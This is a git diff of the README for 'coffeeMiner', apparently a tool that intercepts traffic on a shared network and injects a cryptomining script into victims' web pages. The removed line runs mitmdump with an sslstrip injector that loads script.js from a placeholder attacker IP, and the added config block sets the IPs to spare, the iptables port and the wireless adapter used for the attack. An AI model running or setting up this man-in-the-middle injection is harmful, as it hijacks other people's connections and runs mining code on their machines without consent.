@@ -22,9 +22,15 @@ A blog post about this project can be read here: http://arnaucode.com/blog/coffe
 bash install.sh
 ```
 - edit whitelist.txt with one IP per line (optional)
-- edit coffeeMiner.py config, beginning line 3:
-```py
-os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://[YOUR_IP_HERE]:8000/script.js' -T")
+- edit coffeeMiner.py config, beginning line 4:
+```
+#### BEGIN CONFIG ####
+
+whitelist = 'whitelist.txt' # IP addresses not to target
+port = '8080' # port for IPTables
+adapter = 'wlan0' # change to match your ifconfig setup (eth0, eth1, wlan0, etc.)
+
+####  END CONFIG  ####
 ```
 - execute coffeeMiner.py
 ```
